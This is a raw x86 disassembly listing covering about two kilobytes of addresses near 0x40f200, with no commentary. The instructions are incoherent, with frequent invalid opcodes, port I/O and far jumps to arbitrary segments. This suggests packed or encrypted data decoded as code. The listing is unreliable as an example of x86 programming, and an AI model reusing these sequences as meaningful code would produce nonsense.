  40f1ff:	mov    WORD PTR ds:0x64ad595b,ds
  40f205:	mov    edx,ecx
  40f207:	push   ds
  40f208:	inc    ecx
  40f209:	push   edi
  40f20a:	cwde   
  40f20b:	sar    DWORD PTR [ebp+eax*8-0x7],0x96
  40f210:	imul   ecx,edx,0xd874c346
  40f216:	scas   al,BYTE PTR es:[edi]
  40f217:	or     al,0x69
  40f219:	adc    al,0x6d
  40f21b:	cld    
  40f21c:	or     eax,0xe8e25b74
  40f221:	ins    BYTE PTR es:[edi],dx
  40f222:	(bad)  
  40f223:	popa   
  40f224:	jb     0x40f1ca
  40f226:	mov    esp,0xfebf7c98
  40f22b:	push   ebp
  40f22c:	xchg   ebp,eax
  40f22d:	mov    ds:0xdb658c23,al
  40f232:	ss loop 0x40f209
  40f235:	shl    eax,0x99
  40f238:	test   BYTE PTR [edi-0x64],bh
  40f23b:	xor    cl,BYTE PTR [ebp-0x28b21dc0]
  40f241:	cwde   
  40f242:	sub    BYTE PTR [eax+0x44],al
  40f245:	fidivr WORD PTR [edx+0x7c]
  40f248:	ror    bh,1
  40f24a:	and    al,0xa4
  40f24c:	das    
  40f24d:	int3   
  40f24e:	nop
  40f24f:	push   ebp
  40f250:	repnz inc edi
  40f252:	daa    
  40f253:	mov    ds:0x51d0673d,al
  40f258:	or     edi,esp
  40f25a:	xchg   ecx,eax
  40f25b:	test   BYTE PTR [ebx-0x5f91f350],0xb2
  40f262:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f263:	fucomip st,st(5)
  40f265:	mov    bh,0x1c
  40f267:	mov    bl,0x23
  40f269:	pop    ebx
  40f26a:	pop    edi
  40f26b:	test   BYTE PTR [edx],ah
  40f26d:	cs push edx
  40f26f:	test   DWORD PTR ds:0x9634b2fb,esp
  40f275:	or     al,ch
  40f277:	call   0x3645:0xb83516e5
  40f27e:	std    
  40f27f:	ins    BYTE PTR es:[edi],dx
  40f280:	ficomp WORD PTR ds:0x3481f7ab
  40f286:	ins    DWORD PTR es:[edi],dx
  40f287:	(bad)  
  40f289:	xor    ebx,DWORD PTR [esi]
  40f28b:	and    eax,0xa24f0c76
  40f290:	fcomp  st(3)
  40f292:	scas   eax,DWORD PTR es:[edi]
  40f293:	sub    esp,esp
  40f295:	ret    0x4ca9
  40f298:	rcl    DWORD PTR [ecx],0x5b
  40f29b:	fidivr DWORD PTR [edi-0x26b851ab]
  40f2a1:	dec    ebp
  40f2a2:	idiv   DWORD PTR [esi+0x28]
  40f2a5:	mov    bh,0xd6
  40f2a7:	aam    0xc5
  40f2a9:	lahf   
  40f2aa:	jg     0x40f241
  40f2ac:	out    0x8c,al
  40f2ae:	xlat   BYTE PTR ds:[ebx]
  40f2af:	fwait
  40f2b0:	mov    ah,0x4c
  40f2b2:	lea    esp,[ebp-0x54]
  40f2b5:	fbld   TBYTE PTR [esi]
  40f2b7:	stos   BYTE PTR es:[edi],al
  40f2b8:	je     0x40f25b
  40f2ba:	jp     0x40f2c6
  40f2bc:	aaa    
  40f2bd:	sub    al,0x6b
  40f2bf:	sahf   
  40f2c0:	xor    al,0x38
  40f2c2:	push   es
  40f2c3:	mov    ds:0xaf6d73fc,eax
  40f2c8:	jnp    0x40f2d4
  40f2ca:	jb     0x40f2e2
  40f2cc:	ror    DWORD PTR [edi+0x3a],1
  40f2cf:	jmp    0xd735:0x7dfa436a
  40f2d6:	mov    cl,0x51
  40f2d8:	xor    ecx,DWORD PTR [edi+0x7e]
  40f2db:	mov    edx,0xaf5f0849
  40f2e0:	push   ebx
  40f2e1:	jg     0x40f291
  40f2e3:	jne    0x40f34a
  40f2e5:	loop   0x40f329
  40f2e7:	cwde   
  40f2e8:	in     eax,dx
  40f2e9:	mov    ebp,0xba091ca3
  40f2ee:	mov    edi,0x73c4df47
  40f2f3:	scas   al,BYTE PTR es:[edi]
  40f2f4:	loop   0x40f31c
  40f2f6:	rol    DWORD PTR [ebp+0x140b462d],1
  40f2fc:	push   edx
  40f2fd:	pushf  
  40f2fe:	das    
  40f2ff:	dec    ebp
  40f300:	cmp    al,dh
  40f302:	arpl   WORD PTR [eax-0x43343b7d],di
  40f308:	into   
  40f309:	gs jno 0x40f2c4
  40f30c:	inc    ecx
  40f30d:	jmp    0x43debe61
  40f312:	out    0x96,eax
  40f314:	or     al,0xea
  40f316:	jl     0x40f2e5
  40f318:	arpl   WORD PTR [ebx*1-0x5389a225],di
  40f31f:	jne    0x40f2bc
  40f321:	sub    esp,DWORD PTR [edi-0x3a]
  40f324:	sbb    DWORD PTR [edx+0x39],0xffffffd3
  40f328:	xchg   ebx,eax
  40f329:	pop    es
  40f32a:	sbb    dh,bl
  40f32c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f32d:	adc    bh,BYTE PTR [ecx-0x62bb3a4c]
  40f333:	cmovle esi,esi
  40f336:	(bad)  
  40f337:	pop    edx
  40f338:	mov    ecx,0xd4f1aa61
  40f33d:	dec    edi
  40f33e:	cld    
  40f33f:	cmc    
  40f340:	aam    0x50
  40f342:	and    ebx,DWORD PTR ds:0x5553b60e
  40f348:	bnd jbe 0x40f2df
  40f34b:	mov    ecx,0xe1301eb5
  40f350:	mov    al,ds:0xd212f221
  40f355:	mov    BYTE PTR [ebp+0x48],ah
  40f358:	into   
  40f359:	xor    cl,BYTE PTR [eax+esi*4-0x78]
  40f35d:	cdq    
  40f35e:	pop    ecx
  40f35f:	adc    DWORD PTR [ecx],edi
  40f361:	add    ch,BYTE PTR [ecx-0x16]
  40f364:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f365:	jb     0x40f3e1
  40f367:	and    al,cl
  40f369:	outs   dx,DWORD PTR ds:[esi]
  40f36a:	les    si,DWORD PTR ds:0xef7b8b17
  40f371:	jecxz  0x40f30b
  40f373:	jecxz  0x40f3d2
  40f375:	mov    ds:0x5c8a8545,al
  40f37a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f37b:	sahf   
  40f37c:	dec    esp
  40f37d:	pop    ebx
  40f37e:	lods   al,BYTE PTR ds:[esi]
  40f37f:	pushw  ss
  40f381:	xor    al,0xc0
  40f383:	push   ds
  40f384:	mov    ebx,DWORD PTR [esi+ebp*2+0x3593e4c1]
  40f38b:	test   BYTE PTR [ebp-0x198eaf53],bl
  40f391:	mov    ecx,0x98240a1b
  40f396:	inc    ebp
  40f397:	(bad)  
  40f398:	shl    BYTE PTR [edx-0x1],0x0
  40f39c:	xor    bl,cl
  40f39e:	pop    edi
  40f39f:	aas    
  40f3a0:	sar    DWORD PTR [ebx],cl
  40f3a2:	jmp    0x29918468
  40f3a7:	jl     0x40f3b5
  40f3a9:	push   es
  40f3aa:	test   BYTE PTR [edx],ah
  40f3ac:	inc    esp
  40f3ad:	push   0xae6f7ea0
  40f3b2:	sub    ebx,esp
  40f3b4:	ins    BYTE PTR es:[edi],dx
  40f3b5:	sbb    al,0xe2
  40f3b7:	jge    0x40f3d8
  40f3b9:	push   0x31ae9053
  40f3be:	(bad)  
  40f3bf:	repnz repz xor BYTE PTR [edx-0x491d1e5d],0x6f
  40f3c8:	sub    ah,BYTE PTR ds:0x578c19c6
  40f3ce:	or     BYTE PTR [esi+0x704697a8],0xe7
  40f3d5:	repz loopne 0x40f379
  40f3d8:	push   eax
  40f3d9:	push   ebp
  40f3da:	and    DWORD PTR [esi],eax
  40f3dc:	imul   eax,DWORD PTR [esi-0x70],0xffffffd4
  40f3e0:	outs   dx,BYTE PTR ds:[esi]
  40f3e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f3e2:	or     ebx,ebx
  40f3e4:	mov    ebp,0x12ce68e3
  40f3e9:	push   es
  40f3ea:	xchg   ebx,eax
  40f3eb:	or     ecx,esi
  40f3ed:	icebp  
  40f3ee:	mov    edx,0xd29e341f
  40f3f3:	mov    ds,WORD PTR [eax]
  40f3f5:	xor    cl,BYTE PTR [ebp-0x33]
  40f3f8:	mov    bh,0xdd
  40f3fa:	imul   esi,ebp,0x5d
  40f3fd:	lock out dx,al
  40f3ff:	gs dec edx
  40f401:	inc    ecx
  40f402:	push   ss
  40f403:	cmp    eax,0x8e40633
  40f408:	sbb    al,0x43
  40f40a:	jmp    0xb3ee809e
  40f40f:	mov    BYTE PTR [esi+0x4e],dh
  40f412:	and    edi,DWORD PTR [edx+eiz*4+0xc803ed4]
  40f419:	or     eax,0x88d8b7b3
  40f41e:	out    0xf3,al
  40f420:	push   ss
  40f421:	xchg   edi,eax
  40f422:	(bad)  [ecx-0x783c5362]
  40f428:	or     al,0x52
  40f42a:	in     eax,dx
  40f42b:	test   dl,bl
  40f42d:	mov    ?,WORD PTR [edx-0x6da892e0]
  40f433:	xchg   edi,eax
  40f434:	sub    edx,DWORD PTR [edx+0x4521389d]
  40f43a:	ds aaa 
  40f43c:	in     al,dx
  40f43d:	call   0x7500f592
  40f442:	ins    DWORD PTR es:[edi],dx
  40f443:	pop    esi
  40f444:	jnp    0x40f45f
  40f446:	dec    ebp
  40f447:	clc    
  40f448:	sbb    al,0x7b
  40f44a:	in     eax,0xe7
  40f44c:	pop    ecx
  40f44d:	mov    ah,0xd
  40f44f:	xor    DWORD PTR [edi+0x65c6aea4],0xffffff9b
  40f456:	enter  0xf664,0x18
  40f45a:	push   ss
  40f45b:	inc    ecx
  40f45c:	mov    edi,0x8b7c4566
  40f461:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f462:	inc    ecx
  40f463:	add    al,0x85
  40f465:	nop
  40f466:	rcl    ecx,1
  40f468:	and    eax,DWORD PTR [ebx+0x11bef204]
  40f46e:	mov    ch,0x15
  40f470:	repz jl 0x40f46a
  40f473:	cmp    dl,BYTE PTR [eax+0x3de90ceb]
  40f479:	cmp    al,0x18
  40f47b:	push   ds
  40f47c:	int    0x3f
  40f47e:	add    BYTE PTR gs:[edx*8-0x45b2631c],cl
  40f486:	sar    DWORD PTR [edi],cl
  40f488:	push   0x12
  40f48a:	sar    bh,1
  40f48c:	pushf  
  40f48d:	cmc    
  40f48e:	jne    0x40f459
  40f490:	mov    bh,BYTE PTR [edi]
  40f492:	jl     0x40f4df
  40f494:	jle    0x40f450
  40f496:	int    0xc9
  40f498:	shr    BYTE PTR [ebx-0x28],1
  40f49b:	mov    WORD PTR [edx+0x20915528],?
  40f4a1:	jbe    0x40f472
  40f4a3:	scas   eax,DWORD PTR es:[edi]
  40f4a4:	test   BYTE PTR [ecx-0x24a0b95e],al
  40f4aa:	das    
  40f4ab:	lds    ebp,FWORD PTR [ebx+0x4e]
  40f4ae:	cmp    eax,0xfa09680d
  40f4b3:	jo     0x40f4f9
  40f4b5:	gs inc ebx
  40f4b7:	mov    ds:0x37e05e07,al
  40f4bc:	sbb    cl,BYTE PTR [esi-0x72f3109a]
  40f4c2:	or     ch,cl
  40f4c4:	dec    esp
  40f4c5:	add    al,0x26
  40f4c7:	mov    al,ds:0xf29cbf5c
  40f4cc:	cld    
  40f4cd:	fidiv  WORD PTR [ecx]
  40f4cf:	jmp    0x40f4b0
  40f4d1:	aad    0x3b
  40f4d3:	and    eax,0xf57ccea2
  40f4d8:	sub    ebx,DWORD PTR [eax-0x66e37c58]
  40f4de:	push   eax
  40f4df:	jae    0x40f557
  40f4e1:	repnz mov al,0x8d
  40f4e4:	xchg   edi,eax
  40f4e5:	jmp    0x17f4:0xaa010cfb
  40f4ec:	fs add dh,bl
  40f4ef:	cmp    eax,0x5055950a
  40f4f4:	xor    BYTE PTR [eax+0x4c0075cb],dh
  40f4fa:	dec    ecx
  40f4fb:	pop    ss
  40f4fc:	or     edi,DWORD PTR [ebx+ecx*1-0x6738abf]
  40f503:	push   esp
  40f504:	xor    al,0x1e
  40f506:	(bad)  
  40f507:	daa    
  40f508:	dec    esp
  40f509:	mov    ah,0x1
  40f50b:	pushf  
  40f50c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f50d:	out    0x51,al
  40f50f:	jae    0x40f57c
  40f511:	jo     0x40f4ad
  40f513:	aad    0x31
  40f515:	repnz (bad) 
  40f517:	(bad)  
  40f518:	aad    0x7b
  40f51a:	fistp  WORD PTR [esi+0x4a]
  40f51d:	pusha  
  40f51e:	sbb    ecx,ebp
  40f520:	adc    dl,BYTE PTR [ecx-0xb2f4c11]
  40f526:	ins    DWORD PTR es:[edi],dx
  40f527:	stos   BYTE PTR es:[edi],al
  40f528:	xor    DWORD PTR [edx],ebp
  40f52a:	inc    esi
  40f52b:	pop    ebp
  40f52c:	mov    ds:0x4baa814c,al
  40f531:	test   al,0x88
  40f533:	push   edx
  40f534:	pop    eax
  40f535:	jp     0x40f58f
  40f537:	ins    DWORD PTR es:[edi],dx
  40f538:	hlt    
  40f539:	pop    edx
  40f53a:	(bad)  
  40f53b:	add    DWORD PTR [edi],esi
  40f53d:	(bad)
  40f540:	and    ch,BYTE PTR [esp+esi*4]
  40f543:	test   al,0x11
  40f545:	sbb    eax,0xad8b0fc9
  40f54a:	pop    esi
  40f54b:	aad    0x75
  40f54d:	in     al,dx
  40f54e:	leave  
  40f54f:	inc    edx
  40f550:	adc    esi,DWORD PTR [ebx]
  40f552:	xor    edi,esi
  40f554:	(bad)  
  40f555:	jmp    0xf058036b
  40f55a:	test   eax,0x856fb81e
  40f55f:	fldenv [ecx*1+0x26e14ed4]
  40f566:	leave  
  40f567:	shl    ebp,0xd2
  40f56a:	sub    al,0xa0
  40f56c:	fbstp  TBYTE PTR [esp+edx*1+0x3652676]
  40f573:	jae    0x40f5bd
  40f575:	(bad)  
  40f576:	imul   ecx,DWORD PTR [eax+eax*4+0x32],0xfffffffd
  40f57b:	iret   
  40f57c:	in     eax,0xec
  40f57e:	aad    0x2c
  40f580:	test   BYTE PTR [edi+0x4a],dl
  40f583:	push   cs
  40f584:	lods   al,BYTE PTR ds:[esi]
  40f585:	pop    edx
  40f586:	xor    cl,BYTE PTR [ebx+0x5bbfff9a]
  40f58c:	jle    0x40f5fe
  40f58e:	jle    0x40f5cb
  40f590:	push   esi
  40f591:	mov    esp,0x4ad6d249
  40f596:	dec    ecx
  40f597:	(bad)  
  40f598:	outs   dx,DWORD PTR ds:[esi]
  40f599:	nop
  40f59a:	sbb    ch,0x5a
  40f59d:	(bad)  
  40f59e:	(bad)  
  40f59f:	dec    edx
  40f5a0:	rol    BYTE PTR [ecx+0x3d],0x9b
  40f5a4:	jnp    0x40f623
  40f5a6:	jne    0x40f537
  40f5a8:	sahf   
  40f5a9:	imul   edi,DWORD PTR [edx],0xef030572
  40f5af:	stos   BYTE PTR es:[edi],al
  40f5b0:	(bad)  
  40f5b1:	out    0x48,al
  40f5b3:	add    DWORD PTR [eax-0x5c48f10d],ebx
  40f5b9:	es push esp
  40f5bb:	mov    bl,0xbf
  40f5bd:	jecxz  0x40f5c7
  40f5bf:	jl     0x40f55c
  40f5c1:	push   ds
  40f5c2:	xchg   esp,eax
  40f5c3:	clc    
  40f5c4:	imul   esp,DWORD PTR [edi-0x21bfd930],0xffffffab
  40f5cb:	pop    ebx
  40f5cc:	dec    ecx
  40f5cd:	mov    eax,ds:0x7c71f8f
  40f5d2:	(bad)  
  40f5d3:	fcom   st(3)
  40f5d5:	xchg   ebp,eax
  40f5d6:	cmp    ebx,ebx
  40f5d8:	cmc    
  40f5d9:	push   esp
  40f5da:	ja     0x40f630
  40f5dc:	and    ch,bh
  40f5de:	outs   dx,BYTE PTR ds:[esi]
  40f5df:	pop    esp
  40f5e0:	in     al,0xad
  40f5e2:	and    al,0xfa
  40f5e4:	js     0x40f61a
  40f5e6:	or     dl,0x3b
  40f5e9:	mov    ah,0xc6
  40f5eb:	sbb    edi,DWORD PTR [edi+0x6ffb0a92]
  40f5f1:	or     eax,0x89ab3608
  40f5f6:	or     eax,0xfa95b68
  40f5fb:	sti    
  40f5fc:	or     esp,DWORD PTR [ebx+ebp*8+0x13cf0bbe]
  40f603:	jmp    0xf46f:0x6e48275b
  40f60a:	arpl   WORD PTR [ecx],cx
  40f60c:	clc    
  40f60d:	pop    ss
  40f60e:	mov    ebx,0xcbfd9bb9
  40f613:	pop    edi
  40f614:	sub    bh,BYTE PTR [ecx+0x52]
  40f617:	cld    
  40f618:	xchg   ecx,eax
  40f619:	sub    eax,0x6deaf766
  40f61e:	(bad)  [esi-0x4c276687]
  40f624:	cmp    al,0x83
  40f626:	inc    ebx
  40f627:	aad    0x8
  40f629:	push   0x79
  40f62b:	sysenter 
  40f62d:	mov    bh,0x6f
  40f62f:	aaa    
  40f630:	mov    cl,0x7
  40f632:	add    al,0x81
  40f634:	xor    eax,0xc13cf1be
  40f639:	cmp    eax,0x56157b03
  40f63e:	je     0x40f686
  40f640:	or     al,dl
  40f642:	std    
  40f643:	dec    ebp
  40f644:	or     al,0x26
  40f646:	mov    ebx,0x480e941b
  40f64b:	mov    ecx,0xe88bd498
  40f650:	cmp    BYTE PTR ds:0xf51b8b5f,ah
  40f656:	and    eax,0xf73eaad6
  40f65b:	test   BYTE PTR [ecx+ecx*4+0x26],al
  40f65f:	ss aas 
  40f661:	push   eax
  40f662:	fiadd  DWORD PTR [edx*8+0x2823bb9c]
  40f669:	cdq    
  40f66a:	retf   
  40f66b:	popa   
  40f66c:	jle    0x40f64e
  40f66e:	jne    0x40f685
  40f670:	in     al,dx
  40f671:	xlat   BYTE PTR ds:[ebx]
  40f672:	ins    BYTE PTR es:[edi],dx
  40f673:	adc    BYTE PTR [ecx+0x0],0xd2
  40f677:	jb     0x40f6c0
  40f679:	dec    eax
  40f67a:	out    0x35,eax
  40f67c:	and    eax,0xbda65562
  40f681:	loop   0x40f60d
  40f683:	cmp    al,0xf4
  40f685:	popa   
  40f686:	add    al,0x9
  40f688:	out    dx,eax
  40f689:	mov    bh,0x1
  40f68b:	retf   0xbaa
  40f68e:	in     al,dx
  40f68f:	nop
  40f690:	sub    dl,BYTE PTR [eax-0x24]
  40f693:	or     DWORD PTR [ebp+0x67],0xfffffff5
  40f697:	ins    BYTE PTR es:[edi],dx
  40f698:	lods   eax,DWORD PTR ds:[esi]
  40f699:	mov    dl,dh
  40f69b:	and    dl,BYTE PTR [ecx]
  40f69d:	xor    BYTE PTR ds:0xc4245e20,bh
  40f6a3:	xor    al,BYTE PTR [edx]
  40f6a5:	mov    ds:0xccdf7343,eax
  40f6aa:	mov    bl,0x9d
  40f6ac:	mov    esi,0xfd7f3612
  40f6b1:	push   eax
  40f6b2:	pop    esp
  40f6b3:	or     esp,DWORD PTR [edx-0xd]
  40f6b6:	dec    ebp
  40f6b7:	mov    ebx,0xe97787fe
  40f6bc:	gs push cs
  40f6be:	lods   al,BYTE PTR ds:[esi]
  40f6bf:	or     al,0x93
  40f6c1:	xchg   esp,eax
  40f6c2:	out    0x8e,al
  40f6c4:	pop    esp
  40f6c5:	(bad)  
  40f6c6:	in     al,0x72
  40f6c8:	pushf  
  40f6c9:	sub    al,0x26
  40f6cb:	ja     0x40f69d
  40f6cd:	push   ds
  40f6ce:	push   edi
  40f6cf:	out    dx,al
  40f6d0:	fsubr  QWORD PTR [ebp+0x3b5d2808]
  40f6d6:	ja     0x40f6ad
  40f6d8:	inc    esp
  40f6d9:	mov    ?,WORD PTR [eax]
  40f6db:	and    eax,0xe95ea132
  40f6e0:	pop    ds
  40f6e1:	retf   
  40f6e2:	nop
  40f6e3:	outs   dx,DWORD PTR ds:[esi]
  40f6e4:	and    DWORD PTR [edx-0x1a686a1a],ebx
  40f6ea:	xchg   BYTE PTR [ecx-0x2cf80096],al
  40f6f0:	fdivr  DWORD PTR [ebx-0x1e]
  40f6f3:	retf   0x5224
  40f6f6:	pop    ss
  40f6f7:	cmp    ebp,ebp
  40f6f9:	or     eax,0xd2ec2c04
  40f6fe:	and    al,0xfc
  40f700:	ds scas eax,DWORD PTR es:[edi]
  40f702:	fidiv  DWORD PTR [ebx]
  40f704:	xchg   esi,eax
  40f705:	jle    0x40f6a9
  40f707:	fistp  QWORD PTR [ebx+0x4ce170e0]
  40f70d:	iret   
  40f70e:	jl     0x40f6f5
  40f710:	mov    esp,0xa30772f1
  40f715:	push   edi
  40f716:	pop    esi
  40f717:	or     DWORD PTR [edx],esp
  40f719:	jne    0x40f793
  40f71b:	inc    ebx
  40f71c:	or     al,0x7e
  40f71e:	mov    DWORD PTR [edi+0x52faa284],ebp
  40f724:	add    al,0xc
  40f726:	or     bl,0x26
  40f729:	outs   dx,BYTE PTR ds:[esi]
  40f72a:	popa   
  40f72b:	xor    al,0x3
  40f72d:	pop    edi
  40f72e:	jmp    FWORD PTR [ebx-0x7c]
  40f731:	(bad)  
  40f732:	xor    ch,BYTE PTR [edi]
  40f734:	(bad)
  40f738:	mov    ds:0x7fa31b24,eax
  40f73d:	sub    al,0x6c
  40f73f:	mov    al,0x6b
  40f741:	sti    
  40f742:	pusha  
  40f743:	nop
  40f744:	xchg   edx,eax
  40f745:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f746:	mov    edi,0xad45ce2b
  40f74b:	pop    ebx
  40f74c:	fistp  DWORD PTR [ebx-0x18]
  40f74f:	sbb    BYTE PTR [ecx-0x1e],bl
  40f752:	pop    ss
  40f753:	adc    eax,0x19e9fd81
  40f758:	js     0x40f7bc
  40f75a:	ins    DWORD PTR es:[edi],dx
  40f75b:	mov    dh,0x67
  40f75d:	push   0xc4ca3ae5
  40f762:	cwde   
  40f763:	jg     0x40f75e
  40f765:	fadd   st(4),st
  40f767:	sub    ebx,esp
  40f769:	test   al,0x77
  40f76b:	mov    esp,es
  40f76d:	or     BYTE PTR [esi+0x70],0xf0
  40f771:	std    
  40f772:	lods   al,BYTE PTR ds:[esi]
  40f773:	push   esp
  40f774:	je     0x40f701
  40f776:	mov    al,0x79
  40f778:	sahf   
  40f779:	test   al,0xb7
  40f77b:	pop    ebx
  40f77c:	sbb    BYTE PTR [ebp+0x28cc1332],cl
  40f782:	mov    dl,0xe2
  40f784:	rol    edi,1
  40f786:	call   0x2133:0x778956d7
  40f78d:	mov    al,0x8e
  40f78f:	jno    0x40f7bf
  40f791:	mov    ch,0xff
  40f793:	mov    edx,0xe4c8d9d2
  40f798:	mov    DWORD PTR [ebp-0x48],ecx
  40f79b:	dec    BYTE PTR [ebx+0x2b]
  40f79e:	sbb    edi,DWORD PTR [ebx]
  40f7a0:	push   0x6929bfc3
  40f7a5:	mov    ds:0xc25cfeea,eax
  40f7aa:	out    dx,al
  40f7ab:	and    BYTE PTR [ecx+0x3b],dh
  40f7ae:	lahf   
  40f7af:	fucomi st,st(4)
  40f7b1:	jl     0x40f7c4
  40f7b3:	push   ds
  40f7b4:	mov    bl,0xe9
  40f7b6:	cli    
  40f7b7:	rcr    DWORD PTR [edi+ebx*2],1
  40f7ba:	inc    esp
  40f7bb:	mov    bh,BYTE PTR [ebx+edi*1]
  40f7be:	popf   
  40f7bf:	inc    DWORD PTR [ecx-0x7331587f]
  40f7c5:	jle    0x40f78e
  40f7c7:	push   ebx
  40f7c8:	ffreep st(7)
  40f7ca:	ficomp WORD PTR [eax-0x23]
  40f7cd:	push   0xc9f8209c
  40f7d2:	cdq    
  40f7d3:	jmp    0x40f810
  40f7d5:	mov    esi,?
  40f7d7:	jle    0x40f82f
  40f7d9:	jecxz  0x40f819
  40f7db:	xchg   ebp,eax
  40f7dc:	sub    esi,DWORD PTR [esi]
  40f7de:	out    dx,eax
  40f7df:	inc    ecx
  40f7e0:	lock lahf 
  40f7e2:	sbb    edx,edx
  40f7e4:	jmp    0xd0ab112a
  40f7e9:	and    edi,eax
  40f7eb:	ret    0xfff5
  40f7ee:	jmp    0xff293bd0
  40f7f3:	pop    ds
  40f7f4:	sub    al,0x41
  40f7f6:	outs   dx,DWORD PTR ds:[esi]
  40f7f7:	jnp    0x40f79c
  40f7f9:	mov    edx,0x3973f2bd
  40f7fe:	inc    esi
  40f7ff:	push   edi
  40f800:	mov    edx,0x3d13aae7
  40f805:	test   eax,0x56159305
  40f80a:	sub    BYTE PTR [eax],0xd5
  40f80d:	cmp    ebp,edx
  40f80f:	mov    ebx,DWORD PTR [eax+ebx*2+0x6f]
  40f813:	push   esi
  40f814:	imul   esp,DWORD PTR [ebx+0x1e],0xa0555d78
  40f81b:	(bad)  
  40f81c:	icebp  
  40f81d:	neg    edi
  40f81f:	jecxz  0x40f81a
  40f821:	clc    
  40f822:	imul   ebp,DWORD PTR [ebp-0x4d],0xe4727fcf
  40f829:	shl    BYTE PTR [esi+0x649121d],0x89
  40f830:	in     eax,0xf1
  40f832:	mov    dl,BYTE PTR [edx-0x11]
  40f835:	mov    ds:0x95b3d398,eax
  40f83a:	(bad)  
  40f83b:	or     DWORD PTR [bp-0x32],esi
  40f83f:	push   es
  40f840:	das    
  40f841:	or     eax,0x8849223a
  40f846:	ret    0xbfe0
  40f849:	clc    
  40f84a:	pop    eax
  40f84b:	add    ah,BYTE PTR [ebx+0x74a235d7]
  40f851:	gs push ecx
  40f853:	mov    dl,BYTE PTR [ebx]
  40f855:	push   ebp
  40f856:	cwde   
  40f857:	adc    BYTE PTR [ebp+0x12],al
  40f85a:	xchg   ecx,eax
  40f85b:	test   eax,0x59f488a0
  40f860:	ret    
  40f861:	adc    al,0x37
  40f863:	mov    ch,bl
  40f865:	cmp    BYTE PTR [eax+0x2],bh
  40f868:	inc    ebp
  40f869:	call   0x8bfa:0x490e5a47
  40f870:	mov    DWORD PTR [ebx-0x35],0x9cc714fc
  40f877:	mov    edx,0x644374aa
  40f87c:	mov    dl,0xc9
  40f87e:	stos   BYTE PTR es:[edi],al
  40f87f:	mov    ch,0xf9
  40f881:	test   al,0xe
  40f883:	sub    esi,DWORD PTR [ecx]
  40f885:	test   al,0x8c
  40f887:	jmp    0xc274899f
  40f88c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f88d:	clc    
  40f88e:	xor    BYTE PTR [edx+ecx*8-0x40d3125d],bh
  40f895:	push   esi
  40f896:	mov    WORD PTR [ebp-0x18],fs
  40f899:	inc    ebp
  40f89a:	cvtdq2ps xmm3,xmm6
  40f89d:	loopne 0x40f841
  40f89f:	fnsave [esp+eax*1-0x33]
  40f8a3:	popf   
  40f8a4:	or     BYTE PTR ds:0xc6d0f754,bh
  40f8aa:	push   ecx
  40f8ab:	test   al,0x79
  40f8ad:	aam    0x89
  40f8af:	or     BYTE PTR [esi-0x62],bl
  40f8b2:	lods   eax,DWORD PTR ds:[esi]
  40f8b3:	imul   ebx,DWORD PTR [ebx],0x54f14e60
  40f8b9:	pop    ds
  40f8ba:	and    BYTE PTR [ebx+0x70d52974],dh
  40f8c0:	jo     0x40f8b4
  40f8c2:	(bad)  
  40f8c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f8c4:	(bad)  
  40f8c5:	addr16 pop ds
  40f8c7:	dec    ebx
  40f8c8:	fs js  0x40f8e6
  40f8cb:	xor    BYTE PTR [eax],0x61
  40f8ce:	bound  esp,QWORD PTR [esi-0x79]
  40f8d1:	push   edi
  40f8d2:	dec    edx
  40f8d3:	push   ss
  40f8d4:	inc    ecx
  40f8d5:	inc    ebp
  40f8d6:	push   es
  40f8d7:	je     0x40f900
  40f8d9:	adc    bh,dh
  40f8db:	xor    BYTE PTR [esi-0x155e69bb],bl
  40f8e1:	add    DWORD PTR [ebp-0x3],eax
  40f8e4:	mov    ah,0xf1
  40f8e6:	out    0x66,eax
  40f8e8:	scas   al,BYTE PTR es:[edi]
  40f8e9:	ror    BYTE PTR [ebp+0x5a],cl
  40f8ec:	sar    esp,1
  40f8ee:	lods   al,BYTE PTR ds:[esi]
  40f8ef:	and    DWORD PTR [edi],edx
  40f8f1:	push   esp
  40f8f2:	xchg   esi,eax
  40f8f3:	push   ebp
  40f8f4:	das    
  40f8f5:	push   esp
  40f8f6:	fisub  WORD PTR [ecx-0x65cae9a4]
  40f8fc:	cs cs repnz (bad) 
  40f900:	(bad)  
  40f902:	retf   0xc6f0
  40f905:	add    ebx,edx
  40f907:	inc    ebx
  40f908:	mov    ds:0x41f25e26,eax
  40f90d:	dec    eax
  40f90e:	jno    0x40f96e
  40f910:	xor    cl,BYTE PTR [ecx]
  40f912:	jle    0x40f8ce
  40f914:	(bad)
  40f919:	cdq    
  40f91a:	inc    esi
  40f91b:	scas   eax,DWORD PTR es:[edi]
  40f91c:	enter  0xd678,0x4c
  40f920:	popa   
  40f921:	fcmove st,st(5)
  40f923:	loopne 0x40f8d0
  40f925:	push   ecx
  40f926:	pop    ecx
  40f927:	shl    DWORD PTR [edx-0x61],0x18
  40f92b:	pop    eax
  40f92c:	ficom  DWORD PTR [ecx-0x60096cd7]
  40f932:	out    dx,al
  40f933:	inc    edx
  40f934:	in     eax,0x19
  40f936:	jl     0x40f99b
  40f938:	lea    esi,[ebp-0x54979cc5]
  40f93e:	inc    ecx
  40f93f:	retf   0x89e8
  40f942:	push   esi
  40f943:	adc    BYTE PTR [ebx],bl
  40f945:	stc    
  40f946:	add    edi,DWORD PTR [ebp-0x39fca793]
  40f94c:	aaa    
  40f94d:	sahf   
  40f94e:	pop    edx
  40f94f:	out    0xfe,eax
  40f951:	call   0x33d9:0xc759c658
  40f958:	or     al,0xb0
  40f95a:	add    bh,dh
  40f95c:	push   esp
  40f95d:	jae    0x40f941
  40f95f:	cmp    DWORD PTR ds:0x230dbae7,eax
  40f965:	xchg   esp,eax
  40f966:	stc    
  40f967:	jge    0x40f93d
  40f969:	add    al,0x2a
  40f96b:	and    BYTE PTR [esi+0x104f9469],al
  40f971:	jge    0x40f9ab
  40f973:	mov    ebp,0xc93ecf2
  40f978:	and    DWORD PTR [edx+0x50],edx
  40f97b:	or     ebp,ebx
  40f97d:	xchg   ecx,eax
  40f97e:	adc    ah,dl
